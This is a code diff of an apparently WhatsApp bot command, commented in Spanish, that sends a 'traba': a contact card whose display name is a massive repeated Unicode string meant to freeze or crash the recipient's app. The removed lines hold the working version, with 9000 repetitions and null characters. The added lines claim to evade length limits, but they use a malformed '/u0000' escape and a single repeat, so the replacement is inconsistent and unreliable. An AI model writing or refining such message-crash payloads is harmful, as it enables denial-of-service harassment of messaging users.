@@ -1,11 +1,7 @@
 let handler = async (m, { conn }) => {
   const number = '521234567890'; // Número del contacto
-
-  const basura = '꧅+𝑩𝑨𝑺𝑼𝑹𝑨꧅'.repeat(9000); // Traba base
-  const invisible = '\u0000'; // Carácter invisible
-
-  // Combinar basura + invisible en distintos bloques
-  const trabaFinal = basura + invisible + basura + invisible + basura;
+  const basura = '/u0000'.repeat(1); // Un bloque grande de traba
+  const trabaFinal = basura + basura + basura; // Repetimos 3 veces
 
   const vcard = `
 BEGIN:VCARD
@@ -17,7 +13,7 @@ END:VCARD
 
   await conn.sendMessage(m.chat, {
     contacts: {
-      displayName: basura + invisible + basura + invisible + basura, // Se ve como nombre del contacto
+      displayName: basura + '+' + basura + '+' + basura, // visible, pero ayuda a eludir límite
       contacts: [{ vcard }]
     }
   }, { quoted: m });
